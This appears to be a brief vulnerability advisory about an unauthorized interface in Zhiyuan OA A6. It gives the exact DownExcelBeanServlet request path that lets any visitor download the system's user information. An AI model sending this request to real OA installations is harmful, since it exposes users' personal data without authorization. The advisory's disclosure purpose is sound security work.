# Zhiyuan OA A6 DownExcelBeanServlet User sensitive information leak

## Vulnerability Description

Zhiyuan OA A6 There is an unauthorized interface that causes any visitor to download user information in the OA.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Zhiyuan OA A6</span>

## Network surveying and mapping



## Vulnerability reappears

Visit the following URL to jump to download user information files

```plain
/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
```



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/zhiyuan-18.png)